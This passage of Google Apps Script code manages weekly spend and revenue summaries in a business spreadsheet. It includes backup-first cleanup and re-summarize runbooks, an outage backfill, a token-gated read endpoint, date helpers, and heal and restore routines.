      return wk;
    });

    Logger.log('cleanupOnlineRevenueSummaryRows: ' + (isDryRun ? 'DRY RUN' : 'APPLY') +
      ' — ' + matches.length + ' online revenue row(s) across ' + weekList.length + ' week(s): ' +
      weekList.map(function (w) { return w.week_start; }).join(', '));

    if (isDryRun) {
      return {
        mode: 'dryRun', found: matches.length, deleted: 0, weeks: weekList,
        rows: matches.map(function (r) { return r + 1; })
      };
    }

    // Pass 2: back up EVERY matched row before a single deleteRow fires. A
    // half-backed-up delete is worse than no cleanup at all.
    var backup = ensureSheet(ss, ONLINE_REVENUE_BACKUP_TAB, SUMMARY_HEADERS);
    for (var b = 0; b < matches.length; b++) backup.appendRow(sheetSafeRow_(data[matches[b]]));
    Logger.log('cleanupOnlineRevenueSummaryRows: backed up ' + matches.length +
      ' row(s) to ' + ONLINE_REVENUE_BACKUP_TAB);

    // Pass 3: delete bottom-up so pass-1 row numbers stay valid as rows shift.
    var deleted = 0;
    for (var m = matches.length - 1; m >= 0; m--) {
      sheet.deleteRow(matches[m] + 1);
      deleted++;
    }

    Logger.log('cleanupOnlineRevenueSummaryRows: deleted=' + deleted +
      ' — now run runOnlineRevenueResummarize() to rebuild ' + weekList.length + ' week(s).');
    return { mode: 'apply', found: matches.length, deleted: deleted, weeks: weekList };
  });
}

/**
 * resummarizeWeeks_ — step 4 of the cleanup runbook.
 *
 * weeklySummarize writes ONE week per call, so a single run after the purge
 * would rebuild only the most recent week and leave every older one
 * permanently missing from Summary — doGet would then under-report history
 * instead of double-counting it. This loops it, oldest week first.
 *
 * @param {string[]} weekStarts  'yyyy-MM-dd' Mondays
 * @returns {Object[]} one weeklySummarize result per week, in order
 */
function resummarizeWeeks_(weekStarts) {
  var results = [];
  for (var i = 0; i < weekStarts.length; i++) {
    var res = weeklySummarize(weekStarts[i]);
    results.push({ week: weekStarts[i], result: res });
    Logger.log('resummarizeWeeks_: ' + weekStarts[i] + ' → ' + JSON.stringify(res));
  }
  return results;
}

/**
 * Distinct week_start values sitting in the backup tab, oldest first — the
 * exact set of weeks the apply pass removed, read back rather than re-typed.
 */
function backedUpOnlineRevenueWeeks_(ss) {
  var sheet = ss.getSheetByName(ONLINE_REVENUE_BACKUP_TAB);
  if (!sheet) return [];
  var data = sheet.getDataRange().getValues();
  var seen = {};
  for (var r = 1; r < data.length; r++) {
    var wk = coerceDateStr_(data[r][0]);
    if (DATE_ARG_RE.test(wk)) seen[wk] = true;
  }
  return Object.keys(seen).sort();
}

/* ------------------------------------------------------------------ *
 * Editor entry points for the v23 online-revenue cleanup runbook.
 *
 * The Apps Script Run button passes NO arguments, so
 * cleanupOnlineRevenueSummaryRows(false) and weeklySummarize('2026-07-27') are
 * both unreachable from the editor without a no-arg wrapper — the first would
 * silently dry-run, the second would summarize last week instead of the week
 * asked for. These also Logger.log their reports, because the editor shows log
 * output but NOT return values.
 *
 * Run order: DryRun → Apply → Resummarize.
 * ------------------------------------------------------------------ */

function runOnlineRevenueCleanupDryRun() {
  var report = cleanupOnlineRevenueSummaryRows();
  Logger.log('DRY RUN (nothing written): ' + JSON.stringify(report, null, 2));
  return report;
}

function runOnlineRevenueCleanupApply() {
  var report = cleanupOnlineRevenueSummaryRows(false);
  Logger.log('APPLIED (written): ' + JSON.stringify(report, null, 2));
  return report;
}

/**
 * Rebuild every week the apply pass removed. Reads its week list from the
 * backup tab, so it is only ever meaningful AFTER runOnlineRevenueCleanupApply.
 */
function runOnlineRevenueResummarize() {
  var ss = getHubSpreadsheet_();
  var weeks = backedUpOnlineRevenueWeeks_(ss);
  if (!weeks.length) {
    Logger.log('runOnlineRevenueResummarize: no weeks in ' + ONLINE_REVENUE_BACKUP_TAB +
      ' — run runOnlineRevenueCleanupApply() first.');
    return { weeks: 0, results: [] };
  }
  Logger.log('runOnlineRevenueResummarize: rebuilding ' + weeks.length +
    ' week(s): ' + weeks.join(', '));
  var results = resummarizeWeeks_(weeks);
  Logger.log('RESUMMARIZED: ' + JSON.stringify(results, null, 2));
  return { weeks: weeks.length, results: results };
}

/**
 * runFdcoBackfillResummarize — one-time runbook step for the Food and Dairy Co
 * outage of 2026-07-18 → 2026-09-02.
 *
 * The connector's AWS Cognito session expired on 2026-07-18 and the attended
 * re-login path could not recover it: base_connector loaded the dead session
 * into the browser, and is_logged_in read the stale refreshToken as "logged
 * in", so the login prompt never fired. 46 scheduled runs exited BLOCKED, and
 * 22 invoices totalling $3,025.34 reached `Suppliers` only on 2026-09-02.
 *
 * weeklySummarize writes ONE week per call, and the Monday trigger only ever
 * summarizes the week that just ended — so those back-weeks stay absent from
 * `Summary`. doGet (the weekly report, and LEIBLE_GM_COST_MONITOR's
 * ExpenseAPI.gs) reads `Summary`, not `Suppliers`: until this runs, the money
 * is ingested but invisible.
 *
 * Week 2026-08-31 is deliberately NOT in the list. It had not ended on
 * 2026-09-02, and weeklySummarize refuses an incomplete week rather than
 * freezing a partial total; the Monday 2026-09-07 trigger covers it.
 *
 * REFUSES if any target week still has rows in `_archive`. weeklySummarize
 * rebuilds a week from `Suppliers` alone, so a week split across both tabs has
 * its Summary row overwritten with a partial total — understating it instead
 * of repairing it. Every week here post-dates the 183-day purge line, so the
 * guard should not trip; it exists so that if it ever does, the run stops
 * rather than quietly writing wrong numbers.
 */
function runFdcoBackfillResummarize() {
  var weeks = [
    '2026-07-20', '2026-07-27', '2026-08-03',
    '2026-08-10', '2026-08-17', '2026-08-24'
  ];
  var split = weeksWithArchivedRows_(weeks);
  if (split.length) {
    Logger.log('runFdcoBackfillResummarize: REFUSED — week(s) split across _archive ' +
      'would be understated by a Suppliers-only rebuild: ' + split.join(', '));
    return { refused: 'archived_rows', weeks: split };
  }
  Logger.log('runFdcoBackfillResummarize: rebuilding ' + weeks.length +
    ' week(s): ' + weeks.join(', '));
  // resummarizeWeeks_ logs one line per week — the editor log truncates a
  // single large JSON blob mid-report, which would hide the tail of the run.
  return { weeks: weeks.length, results: resummarizeWeeks_(weeks) };
}

/**
 * Which of `weekStarts` (Mondays, 'yyyy-MM-dd') have at least one row sitting
 * in `_archive`.
 *
 * Reads the LIVE header row rather than SUPPLIERS_HEADERS: editing a *_HEADERS
 * constant does not migrate an existing tab, so trusting the constant can read
 * the wrong column on a tab created under an older schema.
 *
 * @param {string[]} weekStarts
 * @returns {string[]} affected week starts, sorted; [] when every week is clean
 */
function weeksWithArchivedRows_(weekStarts) {
  var ss = getHubSpreadsheet_();
  var arch = ss.getSheetByName(ARCHIVE_TAB);
  if (!arch || arch.getLastRow() < 2) return [];

  var values = arch.getDataRange().getValues();
  var dateCol = values[0].indexOf('date');
  if (dateCol < 0) {
    // Fail closed: an unreadable archive cannot rule out a split week, and a
    // silent [] here would green-light exactly the partial rebuild the caller
    // is guarding against.
    Logger.log('weeksWithArchivedRows_: no "date" column in ' + ARCHIVE_TAB +
      ' — cannot rule out a split week; reporting every week as split.');
    return weekStarts.slice().sort();
  }

  var want = {};
  for (var i = 0; i < weekStarts.length; i++) want[weekStarts[i]] = true;

  var hit = {};
  for (var r = 1; r < values.length; r++) {
    var d = coerceDateStr_(values[r][dateCol]);
    if (!/^\d{4}-\d{2}-\d{2}$/.test(String(d))) continue;
    var wk = weekStartForDate_(d);
    if (want[wk] === true) hit[wk] = true;
  }
  return Object.keys(hit).sort();
}

/* ------------------------------------------------------------------ *
 * Read API (doGet) — token-gated, serves weekly summaries
 * ------------------------------------------------------------------ */

function doGet(e) {
  try {
    var params = (e && e.parameter) || {};
    var tokenCheck = checkReadToken_(params);
    if (!tokenCheck.ok) return jsonOut_({ result: 'error', message: tokenCheck.message });

    var fn = params.fn || 'summary';
    if (fn === 'summary') return doGetSummary_(params);
    if (fn === 'shopspendCoverage') return doGetShopSpendCoverage_();
    return jsonOut_({ result: 'error', message: 'unknown fn: ' + fn });
  } catch (err) {
    return jsonOut_({ result: 'error', message: String((err && err.message) || err) });
  }
}

function doGetSummary_(params) {
  try {
    var ss = getHubSpreadsheet_();
    var sheet = ss.getSheetByName(SUMMARY_TAB);
    if (!sheet) return jsonOut_({ result: 'error', message: 'Summary tab not found. Run weeklySummarize() first.' });

    var data = sheet.getDataRange().getValues();
    if (data.length <= 1) return jsonOut_({ result: 'ok', count: 0, rows: [] });

    var from = params.from || null;
    var to = params.to || null;

    if (!from && !to) {
      var lastWeek = getLastCompletedWeek_(todayStr_());
      from = lastWeek.start;
      to = lastWeek.end;
    }

    var rows = summaryDataToObjects_(data);
    if (from || to) {
      rows = filterSummaryByDateRange_(rows, from, to);
    }

    // department/kind are already emitted by summaryDataToObjects_ (it maps
    // every header generically). Keep the JSON field name 'supplier' — on
    // kind='revenue' rows it holds the SOURCE when location is 'online' and the
    // customer name on every other channel (see aggregateSupplierRows_) — and
    // keep 'total_spend' as a one-release alias for 'total' so existing
    // consumers don't break.
    if (params.department) {
      rows = rows.filter(function (r) { return String(r.department) === String(params.department); });
    }
    rows = rows.map(function (r) {
      // Only alias on a migrated (new-header) sheet — an unmigrated sheet's
      // header is still literally 'total_spend' and already carries it via
      // the generic header mapping above; overwriting it with undefined
      // would be a regression, not backward compatibility.
      if (r.total !== undefined) r.total_spend = r.total;
      return r;
    });

    return jsonOut_({
      result: 'ok',
      week_start: from || null,
      week_end: to || null,
      count: rows.length,
      rows: rows
    });
  } catch (err) {
    return jsonOut_({ result: 'error', message: String((err && err.message) || err) });
  }
}

/**
 * fn=shopspendCoverage — delegates span expansion to shopSpendCoveredWeeks_
 * (shopspend.gs, step 7) so the watchdog and this endpoint never disagree on
 * which weeks count as covered. A missing or empty ShopSpendPulls tab is a
 * normal cold-start state, not an error.
 */
function doGetShopSpendCoverage_() {
  var ss = getHubSpreadsheet_();
  var sheet = ss.getSheetByName(SHOPSPEND_PULLS_TAB);
  var pullsRows = [];
  if (sheet) {
    var data = sheet.getDataRange().getValues();
    pullsRows = data.slice(1);
  }
  var weeks = shopSpendCoveredWeeks_(pullsRows);
  return jsonOut_({ result: 'ok', count: weeks.length, weeks: weeks });
}

function timingSafeEqual_(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  var mismatch = a.length === b.length ? 0 : 1;
  // Compare a against itself when lengths differ, so the loop's cost tracks
  // the caller-supplied value rather than leaking the secret's length.
  var other = mismatch ? a : b;
  for (var i = 0; i < a.length; i++) {
    mismatch |= a.charCodeAt(i) ^ other.charCodeAt(i);
  }
  return mismatch === 0;
}

function checkReadToken_(params) {
  var stored = PropertiesService.getScriptProperties().getProperty('API_READ_TOKEN');
  if (!stored) return { ok: false, message: 'unauthorized' };
  if (!params.token) return { ok: false, message: 'unauthorized' };
  // Not a plain !== — since the write path (doPost weeks_verified_empty) reuses
  // this check, the comparison guards a destructive operation and must not
  // short-circuit on the first differing character.
  if (!timingSafeEqual_(String(params.token), stored)) return { ok: false, message: 'unauthorized' };
  return { ok: true };
}

// new Date(Date.now()), not bare new Date(): todayStr_ is the single "what
// week is it" anchor for weeklySummarize_impl_, healWeeks_ and the drift
// audit, so it must be observable under the test suite's withMockNow (which
// patches Date.now() only). With a bare new Date() every withMockNow block
// silently read the REAL clock, and the audit's in-flight-week test passed
// only while the real date happened to agree with the pinned one — it began
// crashing on 2026-08-31 when the pinned week completed. Same convention as
// recurring.gs/square.gs/orderapp.gs.
function todayStr_() {
  return Utilities.formatDate(new Date(Date.now()), 'Australia/Sydney', 'yyyy-MM-dd');
}

/* ------------------------------------------------------------------ *
 * Date helpers (pure, unit-tested)
 * ------------------------------------------------------------------ */

/**
 * Coerce a Sheet cell value to a 'YYYY-MM-DD' string. Google auto-converts
 * date-looking text into real Date objects, so reads come back as Dates. Use
 * local date components (NOT toISOString, which shifts AEST midnight to the
 * previous UTC day — an off-by-one). Strings pass through unchanged.
 */
function coerceDateStr_(v) {
  if (v instanceof Date) {
    var y = v.getFullYear();
    var m = v.getMonth() + 1;
    var d = v.getDate();
    return y + '-' + (m < 10 ? '0' + m : m) + '-' + (d < 10 ? '0' + d : d);
  }
  return String(v);
}

var DATE_ARG_RE = /^\d{4}-\d{2}-\d{2}$/;

/**
 * Resolve a caller/trigger-supplied date argument to 'YYYY-MM-DD'.
 * A time-based trigger invokes its handler with an EVENT OBJECT as arg 1 — truthy,
 * so `if (!arg)` lets it through and the stringified object lands in a date cell.
 * Accept ONLY a real YYYY-MM-DD calendar date; anything else (event object,
 * 'yesterday', '2026-7-5', '2026-02-31') falls back.
 */
function resolveDateArg_(arg, fallback) {
  if (typeof arg !== 'string') return fallback;
  var s = arg.trim();
  if (!DATE_ARG_RE.test(s)) return fallback;
  var d = new Date(s + 'T00:00:00Z');                    // regex admits 2026-02-31
  if (isNaN(d.getTime()) || d.toISOString().slice(0, 10) !== s) return fallback;
  return s;
}

/**
 * Add n days to a 'YYYY-MM-DD' string. Noon-UTC anchor mirrors weekStartForDate_
 * so DST can never shift the result across a day boundary.
 */
function addDaysStr_(dateStr, n) {
  var d = new Date(dateStr + 'T12:00:00Z');
  d.setUTCDate(d.getUTCDate() + n);
  return d.toISOString().slice(0, 10);
}

function weekStartForDate_(dateStr) {
  var d = new Date(dateStr + 'T12:00:00Z');
  var day = d.getUTCDay(); // 0=Sun, 1=Mon, …
  var diff = (day === 0) ? -6 : 1 - day;
  d.setUTCDate(d.getUTCDate() + diff);
  return d.toISOString().slice(0, 10);
}

function getLastCompletedWeek_(todayStr) {
  var today = new Date(todayStr + 'T12:00:00Z');
  var day = today.getUTCDay();
  var diffToMonday = (day === 0) ? 6 : day - 1;
  var thisMonday = new Date(today);
  thisMonday.setUTCDate(today.getUTCDate() - diffToMonday);
  var lastMonday = new Date(thisMonday);
  lastMonday.setUTCDate(thisMonday.getUTCDate() - 7);
  var lastSunday = new Date(lastMonday);
  lastSunday.setUTCDate(lastMonday.getUTCDate() + 6);
  return {
    start: lastMonday.toISOString().slice(0, 10),
    end: lastSunday.toISOString().slice(0, 10)
  };
}

/* ------------------------------------------------------------------ *
 * Summary aggregation (pure, unit-tested)
 * ------------------------------------------------------------------ */

/**
 * Aggregate one week's raw rows into Summary groups.
 * @param {Array}  rows      Suppliers-shaped rows (kind='spend', default) or
 *                            Revenue-shaped rows (kind='revenue').
 * @param {string} weekStart 'YYYY-MM-DD'
 * @param {string} weekEnd   'YYYY-MM-DD'
 * @param {string} [kind]    'spend' (default) | 'revenue'
 * @returns {Array<{supplier, location, department, kind, total}>}
 *   Spend: supplier=supplier name, location=location, department=row[7].
 *   Revenue: location=channel, department=row[1], supplier (JSON field name
 *     kept for doGet compat) = the customer name. channel='online' rows
 *     (case-insensitive) are EXCLUDED from the rollup entirely (PRD-10):
 *     online revenue's sole producer is shopifyWeeklyPull's pull-owned
 *     supplier='shopify_orderapp' Summary row — deriving a second row here
 *     would double-count beside it. Wholesale customers are real named
 *     accounts and keep their own weekly line. Revenue is never netted
 *     against spend — each kind aggregates into its own groups.
 */
function aggregateSupplierRows_(rows, weekStart, weekEnd, kind) {
  kind = kind || 'spend';
  var groups = {};
  var onlineExcludedCount = 0;
  var onlineExcludedTotal = 0;
  for (var i = 0; i < rows.length; i++) {
    var date = coerceDateStr_(rows[i][0]);
    if (date < weekStart || date > weekEnd) continue;

    var name, location, total, department;
    if (kind === 'revenue') {
      department = rows[i][1] ? String(rows[i][1]) : DEFAULT_DEPARTMENT;
      var channel = String(rows[i][2]);
      location = channel;
      // Online revenue is PULL-OWNED (PRD-10): shopifyWeeklyPull writes the
      // supplier='shopify_orderapp' Summary row directly, and validateIngest_
      // rejects new online Revenue POSTs. Deriving a second per-source online
      // row here would sit BESIDE the pull row (different key, both served by
      // doGet — an additive double-count). Residual channel='online' Revenue
      // rows are historical; they are counted, logged and excluded.
      if (channel.trim().toLowerCase() === 'online') {
        onlineExcludedCount++;
        onlineExcludedTotal += Number(rows[i][4]) || 0;
        continue;
      }
      // Every non-online channel (wholesale especially) keeps per-customer
      // grain: those are real named accounts, and doGet serves Summary only —
      // collapsing them would delete per-customer weekly revenue from the API
      // with no replacement.
      name = String(rows[i][3]);       // customer
      total = Number(rows[i][4]);      // amount
    } else {
      name = String(rows[i][1]);       // supplier
      total = Number(rows[i][2]);
      location = String(rows[i][4]);
      department = rows[i][7] ? String(rows[i][7]) : DEFAULT_DEPARTMENT;
    }

    // Normalized exactly like rowKey_ (.trim().toLowerCase()) so a case- or
    // whitespace-only twin SUMS into one group instead of splitting into two
    // that later collapse onto the same Summary key and lose money via
    // upsertRows_'s duplicatesSkipped branch (REVIEW FIXES 2026-08-26, FIX 2).
    // Display fields keep the FIRST-seen raw casing — doGet consumers and
    // LEIBLE_GM_COST_MONITOR's location mapping read those strings.
    var key = sheetKeyPart_(department) + '||' + kind + '||' +
      sheetKeyPart_(name) + '||' + sheetKeyPart_(location);
    if (!groups[key]) groups[key] = { supplier: name, location: location, department: department, kind: kind, total: 0 };
    groups[key].total += total;
  }

  var result = [];
  var keys = Object.keys(groups).sort();
  for (var k = 0; k < keys.length; k++) {
    var g = groups[keys[k]];
    result.push({
      supplier: g.supplier,
      location: g.location,
      department: g.department,
      kind: g.kind,
      total: Math.round(g.total * 100) / 100
    });
  }
  if (onlineExcludedCount > 0) {
    Logger.log('aggregateSupplierRows_: excluded ' + onlineExcludedCount +
      ' historical channel=online Revenue row(s) ($' +
      (Math.round(onlineExcludedTotal * 100) / 100) + ') from ' + weekStart +
      ' — online revenue is pull-owned (shopify_orderapp, PRD-10); ' +
      'the figure for pre-pull weeks lives in ' + ONLINE_REVENUE_BACKUP_TAB);
  }
  return result;
}

/**
 * The single source of truth for what a Summary heal WOULD do, for a given
 * set of weeks. Both the read-only preview (previewSummaryHeal) and the
 * eventual write path call this — they must never diverge, because the
 * preview is the only look Jake gets before real money moves. Pure: `ctx` is
 * built ONCE by the caller and holds `archiveWeeks` (a Set of week_start
 * strings present in `_archive`), `summaryRows` (live Summary values,
 * header included), `supplierRows`, `revenueRows` — this function performs
 * NO Sheet reads and NO Sheet writes.
 *
 * @param {string[]} weeks 'YYYY-MM-DD' week_start strings to plan
 * @param {{archiveWeeks:Object, summaryRows:Array, supplierRows:Array, revenueRows:Array}} ctx
 * @returns {Array<{week:string, action:string, rows:Array, projectedSetValues:number, reason:?string}>}
 *   action is one of:
 *     'heal'                 — rows is [{key, live, computed, delta, isNew}]
 *     'skip-split'           — the week has at least one _archive row
 *     'refuse-duplicate-keys'— the live Summary already holds duplicate keys
 *   No pull-owned filtering of any kind: a derived row (e.g. Bennetts,
 *   location='') is healed like any other. Rows that are structurally
 *   unreachable from Suppliers/Revenue (e.g. shopify_orderapp's online
 *   revenue, excluded by aggregateSupplierRows_ itself) never appear in the
 *   recomputed batch and so are left untouched, not orphaned.
 */
function computeHealPlan_(weeks, ctx) {
  var archiveWeeks = ctx.archiveWeeks || {};
  var summaryRows = ctx.summaryRows || [];
  var supplierRows = ctx.supplierRows || [];
  var revenueRows = ctx.revenueRows || [];

  var plan = [];
  for (var w = 0; w < weeks.length; w++) {
    var week = weeks[w];
    var weekEnd = addDaysStr_(week, 6);

    if (archiveWeeks[week]) {
      plan.push({
        week: week,
        action: 'skip-split',
        rows: [],
        projectedSetValues: 0,
        reason: 'week has _archive row(s) — a heal here would overwrite a partial recompute (split week)'
      });
      continue;
    }

    // Live rows for this week, keyed exactly as rowKey_(SUMMARY_KEY_COLS)
    // would key them — duplicate detection mirrors that normalization.
    var liveCounts = {};
    var live = {};
    for (var s = 1; s < summaryRows.length; s++) {
      var srow = summaryRows[s];
      if (coerceDateStr_(srow[0]) !== week) continue;
      var lkey = rowKey_(srow, SUMMARY_KEY_COLS);
      liveCounts[lkey] = (liveCounts[lkey] || 0) + 1;
      live[lkey] = { total: Number(srow[SUMMARY_TOTAL_COL]) };
    }
    var hasDuplicate = false;
    for (var lk in liveCounts) {
      if (liveCounts[lk] > 1) { hasDuplicate = true; break; }
    }
    if (hasDuplicate) {
      plan.push({
        week: week,
        action: 'refuse-duplicate-keys',
        rows: [],
        projectedSetValues: 0,
        reason: 'live Summary already holds duplicate keys for this week — refusing to heal until deduplicated'
      });
      continue;
    }

    var recomputed = aggregateSupplierRows_(supplierRows, week, weekEnd, 'spend')
      .concat(aggregateSupplierRows_(revenueRows, week, weekEnd, 'revenue'));

    var rows = [];
    var projectedSetValues = 0;
    for (var g = 0; g < recomputed.length; g++) {
      var grp = recomputed[g];
      var keyRow = mayersSummaryKeyRow_(week, grp.department, grp.kind, grp.supplier, grp.location);
      var key = rowKey_(keyRow, SUMMARY_KEY_COLS);
      var hit = live[key];

      if (!hit) {
        // Brand-new row: upsertRows_ appends it — 0 setValue calls.
        rows.push({ key: key, live: null, computed: grp.total, delta: grp.total, isNew: true });
        continue;
      }
      if (auditCents_(hit.total) === auditCents_(grp.total)) continue; // matches — nothing to write

      var delta = Math.round((grp.total - hit.total) * 100) / 100;
      // An updated row: upsertRows_ pays amountCol + stampCol — 2 setValue calls.
      rows.push({ key: key, live: hit.total, computed: grp.total, delta: delta, isNew: false });
      projectedSetValues += 2;
    }

    plan.push({ week: week, action: 'heal', rows: rows, projectedSetValues: projectedSetValues, reason: null });
  }
  return plan;
}

/* ------------------------------------------------------------------ *
 * Guarded shared write path (PRD-12) — healWeeks_/healWeek_
 *
 * healWeek_ is the ONE place a heal (scheduled or override, including every
 * greenBeanPull_ override call routed through weeklySummarize) is allowed to
 * touch Summary: snapshot-once backup, SPLIT guard, duplicate-key refusal,
 * the actual upsert, and the correction alert all live here so no caller can
 * write around any of them.
 * ------------------------------------------------------------------ */

/**
 * Pure. Given Summary_heal_backup rows (possibly holding more than one
 * snapshot for a week, which healBackupWeek_'s write-once guard is meant to
 * prevent but a restore must still defend against), returns only the
 * EARLIEST snapshot's rows for that week — never a later, already-corrected
 * one. Row shape is SUMMARY_HEAL_BACKUP_HEADERS (SUMMARY_HEADERS + run_id);
 * "earliest" is decided by original row order (append order), not run_id
 * content.
 * @param {Array} backupRows  Summary_heal_backup DATA rows (no header)
 * @param {string} week 'YYYY-MM-DD'
 * @returns {Array} the earliest snapshot's rows for `week`, or []
 */
function healEarliestBackupRows_(backupRows, week) {
  var firstRunId = null;
  var result = [];
  for (var i = 0; i < backupRows.length; i++) {
    var row = backupRows[i];
    if (coerceDateStr_(row[0]) !== week) continue;
    var runId = row[SUMMARY_BACKUP_RUNID_COL];
    if (firstRunId === null) firstRunId = runId;
    if (runId !== firstRunId) continue; // a later snapshot for the same week — ignore
    result.push(row);
  }
  return result;
}

/**
 * Data undo (TODO.md "Rollback facts an operator needs at 3am"): a bad heal
 * has no delete path of its own (upsertRows_ only appends/setValue-updates),
 * so this is the only way back. Overwrites `week`'s LIVE Summary rows with
 * its EARLIEST Summary_heal_backup snapshot via healEarliestBackupRows_ —
 * never a later, already-corrected one. Reachable from the Run button via the
 * zero-arg restoreSummaryWeekFromBackup() wrapper (summary_audit.gs);
 * not wired to any trigger.
 * CRITICAL: validates the snapshot BEFORE touching any live rows.
 *
 * step8 FIX2: the actual delete+append is wrapped in withScriptLock_ — this
 * is the documented 3am-incident tool, run while the 04:00 weeklySummarize
 * trigger may be mid-run, and an unlocked delete+append could interleave with
 * a concurrent heal's upsert and silently lose one or the other.
 *
 * @param {string} week 'YYYY-MM-DD'
 * @returns {{week:string, refused:string} | {week:string, restored:number}}
 *   refused: refusal reason (no snapshot, malformed data, lock timeout, etc.)
 */
function restoreWeekFromHealBackup_(week) {
  var ss = getHubSpreadsheet_();
  var summSheet = ss.getSheetByName(SUMMARY_TAB);
  var backupSheet = ss.getSheetByName(SUMMARY_HEAL_BACKUP_TAB);

  if (!summSheet) return { week: week, refused: 'Summary sheet not found' };
  if (!backupSheet) return { week: week, refused: 'Summary_heal_backup sheet not found' };

  var backupRows = backupSheet.getDataRange().getValues().slice(1);
  var snapshotRows = healEarliestBackupRows_(backupRows, week);

  if (snapshotRows.length === 0) {
    return { week: week, refused: 'no-snapshot' };
  }

  for (var v = 0; v < snapshotRows.length; v++) {
    var total = Number(snapshotRows[v][SUMMARY_TOTAL_COL]);
    if (!isFinite(total)) {
      return { week: week, refused: 'malformed snapshot: total is not numeric' };
    }
  }

  // step10 FIX1 (CRITICAL): the delete predicate is scoped to what this
  // snapshot OWNS — never (week) alone. Rows written to the week AFTER the
  // baseline froze that no heal can produce (shopify_orderapp's directly
  // written online revenue, PRD-10; Labour's external LABOUR_SHEET_ID pull)
  // are in neither the snapshot nor any recompute, so a by-week delete
  // destroyed them with NO recovery path while the restore still reported
  // success — probe-confirmed: a $4,321.55 shopify_orderapp row went 1 -> 0
  // rows under {restored:1}. mayers.gs:505 documents the same hazard against
  // the ~$14,219 Bennetts row.
  //
  // A live row for the week is deleted when EITHER
  //   (a) its FULL SUMMARY_KEY_COLS tuple is in the snapshot — the baseline
  //       owns it, so restore it by delete + re-append; or
  //   (b) it is not heal-foreign — a heal COULD have minted it, including a
  //       brand-new key from a supplier/location rename that upsertRows_ has
  //       no delete path for, so undoing the heal must remove it.
  // Otherwise it is PRESERVED. A heal-foreign row absent from the snapshot is
  // therefore never touched, whatever the baseline was — including the
  // "restore to nothing" empty-baseline case.
  var snapshotKeys = {};
  var restorable = [];
  for (var k = 0; k < snapshotRows.length; k++) {
    // step9 FIX1: the empty-baseline marker records "restore to nothing" — it
    // is not itself a live row to re-insert, and carries no real key.
    if (snapshotRows[k][SUMMARY_KIND_COL] === SUMMARY_HEAL_EMPTY_MARKER_KIND_) continue;
    snapshotKeys[rowKey_(snapshotRows[k], SUMMARY_KEY_COLS)] = true;
    restorable.push(snapshotRows[k]);
  }

  var applied = withScriptLock_(function () {
    var liveValues = summSheet.getDataRange().getValues();
    var deleted = 0;
    var preserved = 0;
    for (var r = liveValues.length - 1; r >= 1; r--) {
      var live = liveValues[r];
      if (coerceDateStr_(live[0]) !== week) continue;
      var owned = !!snapshotKeys[rowKey_(live, SUMMARY_KEY_COLS)] || !summaryRowIsHealForeign_(live);
      if (!owned) { preserved++; continue; }
      summSheet.deleteRow(r + 1);
      deleted++;
    }
    var appended = 0;
    for (var s = 0; s < restorable.length; s++) {
      summSheet.appendRow(sheetSafeRow_(restorable[s].slice(0, SUMMARY_BACKUP_RUNID_COL)));
      appended++;
    }
    return { restored: appended, deleted: deleted, preserved: preserved };
  });

  if (applied === LOCK_TIMEOUT_) {
    return { week: week, refused: 'locked: could not acquire the script lock for restore — retry shortly' };
  }

  Logger.log('restoreWeekFromHealBackup_: week ' + week + ' — restored ' + applied.restored +
    ' row(s) from the earliest ' + SUMMARY_HEAL_BACKUP_TAB + ' snapshot (deleted ' +
    applied.deleted + ', preserved ' + applied.preserved +
    ' row(s) written after the baseline that this snapshot does not own)');
  return {
    week: week, restored: applied.restored,
    deleted: applied.deleted, preserved: applied.preserved
  };
}

/**
 * Snapshot-once backup of a week's LIVE Summary rows (pre-heal state) to
 * SUMMARY_HEAL_BACKUP_TAB, tagged with ctx.runId. Refuses to overwrite an
 * existing snapshot for the week — without that, healing the same week twice
 * would store the POST-heal values as a later "snapshot", and a restore
 * would restore the corruption instead of undoing it. Always runs BEFORE any
 * guard decision or write, so a SPLIT-skipped or duplicate-refused week is
 * backed up exactly like a healed one.
 * @returns {boolean} true — a snapshot for `week` exists after this call.
 */
function healBackupWeek_(week, ctx) {
  if (ctx.backedUpWeeks[week]) return true;

  var rowsForWeek = [];
  for (var i = 1; i < ctx.summaryRows.length; i++) { // row 0 = header
    var row = ctx.summaryRows[i];
    if (coerceDateStr_(row[0]) !== week) continue;
    rowsForWeek.push(row.concat([ctx.runId]));
  }
  if (rowsForWeek.length === 0) {
    // step9 FIX1: a newly-summarized week has ZERO live rows to snapshot —
    // without an explicit marker, ctx.backedUpWeeks (seeded in healWeeks_
    // only from rows actually present in Summary_heal_backup) never learns
    // this week was already handled, and the NEXT heal falsifies the
    // baseline by snapshotting its own (by-then non-empty) output.
    var weekEnd = addDaysStr_(week, 6);
    rowsForWeek.push([week, weekEnd, '', '', 0, ctx.extractedAt, '', SUMMARY_HEAL_EMPTY_MARKER_KIND_, ctx.runId]);
  }
  for (var r = 0; r < rowsForWeek.length; r++) {
    ctx.backupSheet.appendRow(sheetSafeRow_(rowsForWeek[r]));
  }
  ctx.backedUpWeeks[week] = true;
  return true;
}

/**
 * Raise one all-day calendar alert for a heal event on `week`. Routes through
 * raiseCalendarAlert_ (staleness.gs) — the ONE function in the project
 * allowed to touch the calendar API directly — which resolves the color from
 * a string key, is idempotent within a day (a title already on today's
 * events is treated as already raised), and joins `bodyLines` itself; never
 * throws.
 * @param {string} week 'YYYY-MM-DD'
 * @param {string} kind short label, folded into the (stable) event title
 * @param {string[]} bodyLines caller must NOT hand-build one blob — passed
 *   straight through to raiseCalendarAlert_, which joins with '\n'.
 * @param {boolean} highSeverity RED (not ORANGE) — reserved for a SPLIT-skip
 *   or duplicate-refusal of the NEWEST week: a silently un-summarized current
 *   week is worse than a slightly wrong one (PRD-12).
 * @param {{loaded:boolean, existing:Object}} [eventsCache] step8 FIX4 — shared
 *   across every healRaiseAlert_ call in one healWeeks_ run so the calendar
 *   day is read ONCE for the whole batch, not once per corrected week.
 */
function healRaiseAlert_(week, kind, bodyLines, highSeverity, eventsCache) {
  try {
    var title = 'LEIBLE expense Summary heal ' + week + ': ' + kind;
    raiseCalendarAlert_(title, bodyLines, highSeverity ? 'RED' : 'ORANGE', Date.now(), eventsCache);
  } catch (err) {
    Logger.log('healRaiseAlert_: failed for week ' + week + ' — ' + err.message);
  }
}

/**
 * The guarded per-week write. Every caller (the scheduled run and every
 * override, greenBeanPull_'s included) goes through this — see healWeeks_
 * for the shared entry point that builds `ctx` once per run and calls this
 * per week, newest-first.
 *
 * Order, always: (1) backup (2) SPLIT guard (3) duplicate-key refusal
 * (4) write via one upsertRows_ call (5) correction alert, raised
 * immediately — never batched to the end of the run.
 *
